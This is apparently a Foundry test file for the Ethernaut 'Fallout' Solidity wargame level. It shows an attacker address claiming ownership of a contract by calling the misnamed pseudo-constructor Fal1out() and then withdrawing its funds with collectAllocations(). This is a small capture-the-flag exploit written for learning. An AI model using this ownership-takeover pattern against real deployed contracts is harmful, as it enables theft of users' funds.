// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";
import {console2} from "forge-std/console2.sol";

contract FalloutTest is Test{
    Fallout public falloutContract;
    address public hacker = makeAddr("hacker");

    function setUp() public{
        vm.startBroadcast();
        falloutContract = new Fallout();
        vm.stopBroadcast();
    }


    function testFunctionRevertIfIsCalledBeforeTheOwnerIsChanged() public{
        vm.expectRevert();
        vm.prank(hacker);
        falloutContract.collectAllocations();
    }

    function testHackerGetOwnershipFromTheConstructorCareProblem() public{
         vm.startPrank(hacker);
         falloutContract.Fal1out();
        // The test will fail if the hacker is not the owner.
         falloutContract.collectAllocations();
    }


}